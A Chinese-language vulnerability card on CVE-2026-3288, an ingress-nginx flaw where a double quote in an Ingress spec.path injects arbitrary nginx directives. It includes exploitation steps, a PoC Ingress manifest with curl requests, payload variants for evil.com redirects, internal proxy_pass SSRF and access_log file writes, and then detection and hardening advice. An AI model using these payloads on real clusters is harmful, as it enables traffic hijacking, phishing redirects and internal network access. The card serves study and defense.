---
id: cloud-k8s-ingress-nginx-spec-path-quote-config-injection
title: ingress-nginx spec.path 双引号逃逸注入任意 nginx 指令（CVE-2026-3288）
type: scenario
domain: cloud
path: cloud/k8s
technique: nginx-template-quote-escape-config-injection
tags:
- kubernetes
- ingress-nginx
- config-injection
- nginx
- cve
- template-injection
- rbac
- ssrf
cve:
- CVE-2026-3288
severity: high
confidence: high
affected_versions: < 1.13.8, < 1.14.4, < 1.15.0
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T11:56:09+08:00'
  notes: '已对照全文与内嵌 8 张截图（提取后逐张阅读）：图01 K3s v1.30.14 + ingress-nginx v1.13.7；图02 $host/$1 变量注入生成 rewrite；图03 正常 200、$host 注入 404、无匹配 Host 404；图04 恶意 path 与第984行注入 return 200；图05 location 893/984 与 fallback 994/1082；图06 PR #14669 sanitizeQuotedRegex diff；图07 四次 CVE；图08 检测脚本输出。卡内原理、PoC、CVE、版本区间与原文一致。已按原文明确区间设置 affected_versions。未验证点：PoC 未在本机执行；access_log 写文件、proxy_pass SSRF 原文标注理论/受限，卡内已注明；CVE-2026-3288 未做外部独立确认。'
url: /docs/cloud/k8s/cloud-k8s-ingress-nginx-spec-path-quote-config-injection/
draft: false
kb_aliases:
- CVE-2026-3288
- ingress-nginx 配置注入
- spec.path 注入
- rewrite-target 注入
- nginx.conf 指令注入
- sanitizeQuotedRegex
---

## 一句话结论

ingress-nginx 的 `buildProxyPass` 用 `fmt.Sprintf` 把 Ingress 的 `spec.path` 直接填进 `rewrite "(?i)%s" ...` 的双引号内且不转义；K8s API 对 path 只做 URL 格式检查、允许双引号，攻击者用一个 `"` 闭合 regex 引号并用分号分隔，就能在生成的 nginx.conf 中注入任意 nginx 指令（return、proxy_pass、access_log 等），controller 会正常重载配置。

## 原理

- ingress-nginx 读取 Ingress 后通过 Go 模板生成 nginx.conf。`internal/ingress/controller/template/template.go` 的 `buildProxyPass` 中：
  `fmt.Sprintf(`rewrite "(?i)%s" %s break; ...`, path, location.Rewrite.Target, ...)`
  两个 `%s` 分别是 `spec.rules[].http.paths[].path` 与 `rewrite-target` annotation，均未做输出转义。
- `path` 被放在 `"(?i)%s"` 的双引号内。若 path 含 `"`，该引号会闭合 rewrite 的 regex 字符串；后续内容配合 `;` 被 nginx 解析为独立指令。例如 path：
  `/" /x break; return 200 "CVE-2026-3288-CONFIG-INJECTED"; rewrite "(?i)/`
  生成的配置变为：
  `rewrite "(?i)/" /x break; return 200 "CVE-2026-3288-CONFIG-INJECTED"; rewrite "(?i)/" /test break;`
  三条指令按分号拆分，第二条是攻击者注入的 `return 200`。
- 为什么 path 能过校验：它不属于 annotation 系统，只受 K8s API Server 的 URL 格式检查（不能含 `//` 等），该检查不禁止双引号、分号、反斜杠。`rewrite-target` annotation 则受 `RegexPathWithCapture`（`^/?[a-zA-Z0-9\/\$-]*$`）限制，只能注入 `$host`、`$1` 这类纯字母数字变量，无法直接写入任意指令。
- location 的副作用：同一个 path 还会生成 `location ~* "^/PATH"` 正则 location。path 中的 `"` 在 location 里被 nginx 当作 `\"` 字面量，导致该 location 只匹配以 `/"` 开头的请求；controller 同时生成一个不含注入指令的 fallback location `~* "^/"`，普通 `/` 请求走 fallback，看不到注入效果。发送 `GET /"x` 这类以 `/"` 开头的请求才会命中含注入指令的 location，返回攻击者自定义的 200。
- 注入能力：`return 200/403/301` 可做内容劫持、拒绝服务、开放重定向；`set` 可改变量；`proxy_pass` 可尝试 SSRF（受正则 location 匹配限制，原文标注为受限/待验证）；`access_log` 可写文件；`content_by_lua_block` 在加载 ngx_lua 时可代码执行（需模块）。
- 修复 PR #14669 只在 path 上套 `sanitizeQuotedRegex`（对 `\` 与 `"` 前加反斜杠），`rewrite-target` 仍未处理，属于修补式修复；根因是模板层没有统一输出转义，四年内 CVE-2021-25746、CVE-2023-5044、CVE-2024-7646、CVE-2026-3288 反复出现同类问题。

## 触发条件

- ingress-nginx 版本 < 1.13.8 / < 1.14.4 / < 1.15.0。
- 攻击者具备创建或修改 Ingress 资源的 RBAC 权限（多租户集群中开发者通常有）。
- controller 能正常监听 Ingress 变更并重载 nginx。
- 注入的 location 需要以 `/"` 开头的请求触发；若只想造成配置层面的影响，创建 Ingress 本身即可。

## 利用步骤

1. 确认目标 ingress-nginx 版本（Pod 镜像 tag、`/version` 或 controller 日志）。
2. 创建一个带恶意 path 的 Ingress，path 用 `"` 闭合 rewrite 引号并注入目标指令，pathType 用 `ImplementationSpecific`，配合 `use-regex: "true"`。
3. 等待 controller 重载，查看生成的 nginx.conf（controller Pod 内 `/etc/nginx/nginx.conf`），确认注入指令出现在 rewrite 行。
4. 发送以 `/"` 开头的请求（如 `GET /"x`，必要时用 `curl --path-as-is`）命中注入 location，观察自定义响应/重定向。
5. 按需替换注入指令：`return 301 https://evil.com` 做重定向劫持，`proxy_pass http://内网IP:端口` 尝试 SSRF，`access_log /tmp/x` 尝试写文件。
6. 记录 controller 日志中的 `Backend successfully reloaded`，确认配置生效。

## PoC

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: exploit-path-inject
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /test
    nginx.ingress.kubernetes.io/use-regex: "true"
spec:
  ingressClassName: nginx
  rules:
  - host: path-inject.example.com
    http:
      paths:
      - path: /" /x break; return 200 "CVE-2026-3288-CONFIG-INJECTED"; rewrite "(?i)/
        pathType: ImplementationSpecific
        backend:
          service:
            name: echo-backend
            port:
              number: 80
```

```bash
# 触发生效的请求（以 /" 开头，命中注入的 location）
curl --path-as-is -H 'Host: path-inject.example.com' 'http://<ingress-ip>/"x'
# 返回 200 与 CVE-2026-3288-CONFIG-INJECTED

# 普通请求 / 会走 fallback location，看不到注入效果
curl -H 'Host: path-inject.example.com' 'http://<ingress-ip>/'
```

```text
# controller 日志
I0624 14:38:27.135483 7 controller.go:231] "Backend successfully reloaded"
```

## 变体与关联

- 变体：`rewrite-target` annotation 变量注入。验证器允许 `$`、字母数字，可写 `/$host` 或 `/$1`，通过 Host 头或正则捕获组改变 rewrite 目标；只能改参数，不能注入新指令。
- 变体：注入 `return 301 https://evil.com` 做开放重定向/钓鱼；注入 `return 403` 做定向拒绝服务；注入 `proxy_pass http://内网` 尝试 SSRF（受 location 匹配限制）。
- 变体：其他 `fmt.Sprintf` 模板位置若把用户可控字段写入 nginx 配置且未转义，可能有同类问题；审计时应全量检查模板拼接点。
- 关联：CVE-2021-25746（多 annotation 注入）、CVE-2023-5044（permanent-redirect 注入）、CVE-2024-7646（snippet 验证绕过）为同根因历史漏洞；本条是攻击面从 annotation 扩展到 spec.path 的第四例。
- 边界：升级到修复版本后 path 中的 `\` 与 `"` 被转义，注入不成立；无 Ingress 创建权限、controller 不重载、或准入策略拦截特殊字符时不可利用。

## 检测与防御

- 检测：扫描集群所有 Ingress 的 `spec.path`，对含 `"`、`;`、`\` 的 path 告警；扫描 `rewrite-target` 等 annotation 中是否含 `$` 变量。
- 检测：监控 Ingress 创建/修改事件与 controller 配置重载；对比 nginx.conf 中 rewrite/location 行是否出现非预期指令或分号拼接。
- 防御：升级到 ingress-nginx v1.13.8+ / v1.14.4+ / v1.15.0+；用 OPA/Gatekeeper 等准入策略拒绝 path 中的 `"`、`;`、`\`。
- 防御：限制 Ingress 创建/修改的 RBAC，只授予必要的命名空间与资源；对 controller Pod 做网络策略限制出站，降低 proxy_pass SSRF 的影响。
- 加固：把 Ingress 特殊字符检查纳入 CI/巡检；关注同根因的模板拼接点，避免只修一个入口。
